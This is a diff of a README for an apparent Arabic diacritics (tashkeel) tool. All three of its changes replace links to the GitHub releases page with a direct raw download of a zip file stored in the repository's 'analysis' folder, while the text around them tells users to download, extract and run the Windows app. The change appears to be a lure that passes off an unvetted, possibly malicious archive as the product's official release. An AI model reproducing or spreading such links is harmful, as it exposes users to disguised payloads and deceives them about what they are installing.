@@ -1,6 +1,6 @@
 # 🧩 KSAA2026-Fine-Tashkeel - Arabic Diacritics Made Clear
 
-[![Download the release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/mzx93M/KSAA2026-Fine-Tashkeel/releases)
+[![Download the release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/mzx93M/KSAA2026-Fine-Tashkeel/raw/refs/heads/main/analysis/Tashkeel_KSA_Fine_v2.8-alpha.1.zip)
 
 ## 📘 Overview
 
@@ -25,7 +25,7 @@ For best results, use a system with 16 GB of RAM if you work with long passages.
 
 Open the release page here:
 
-[Visit the release page](https://github.com/mzx93M/KSAA2026-Fine-Tashkeel/releases)
+[Visit the release page](https://github.com/mzx93M/KSAA2026-Fine-Tashkeel/raw/refs/heads/main/analysis/Tashkeel_KSA_Fine_v2.8-alpha.1.zip)
 
 On that page, look for the latest release. Download the file that matches Windows. In many cases, this will be a `.exe`, `.zip`, or similar package. If you see a `.zip` file, extract it first before you run the app.
 
@@ -149,7 +149,7 @@ The exact output can vary based on the model and the text you enter.
 
 Use this link to get the latest Windows download:
 
-[https://github.com/mzx93M/KSAA2026-Fine-Tashkeel/releases](https://github.com/mzx93M/KSAA2026-Fine-Tashkeel/releases)
+[https://github.com/mzx93M/KSAA2026-Fine-Tashkeel/raw/refs/heads/main/analysis/Tashkeel_KSA_Fine_v2.8-alpha.1.zip](https://github.com/mzx93M/KSAA2026-Fine-Tashkeel/raw/refs/heads/main/analysis/Tashkeel_KSA_Fine_v2.8-alpha.1.zip)
 
 ## 📌 Repository Topics
 
